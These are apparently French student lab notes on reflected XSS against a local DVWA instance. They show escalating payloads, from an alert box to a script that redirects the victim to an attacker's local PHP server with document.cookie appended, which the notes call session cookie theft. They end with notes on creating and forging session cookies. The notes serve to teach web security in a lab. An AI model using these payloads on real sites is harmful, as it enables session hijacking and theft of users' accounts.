# XSS Reflected Low 


- formulaire où on demande à l'utilisateur de saisir son nom 

- si on soumet à vide => rien
- si on met un nom => affiche le Hello nom saisi 
- la valeur saisie dans le formulaire figure dans l'adresse internet de la page une fois soumis
- http://127.0.0.1:4280/vulnerabilities/xss_r/?name=Alain#
- $_GET 
- pas de champ de formulaire `<input type="hidden">`

tentative 1 : Alain
tentative 2 : <h1>Alain</h1>
tentative 3 : <script>alert('virus')</script>


// créer un serveur local de l'attaquant
```sh
php -S localhost:1234
```

tentative 4 : <script>window.location='http://localhost:1234'</script>
// appeler via javascript le serveur local de l'attaquant

tentative 4 : <script>window.location='http://localhost:1234?g='+document.cookie</script>
// appeler, via javascript, le serveur local de l'attaquant ET lui donner ton cookie de SESSION

// vol de cookie 

# comment le serveur créer le cookie ??

```php
session_start(); 
```

# comment comment créer un cookie côté navigateur ??

```js
const maintenant = new Date()
maintenant.setTime(maintenant.getTime() + 60000) // maintenant + 60 secondes
document.cookie = "personnalise=toto; expires=" + maintenant.toUTCString() + ";"
// document.cookie = "PHPSESSIONID=68796817684618471387; expires=" + maintenant.toUTCString() + ";"
```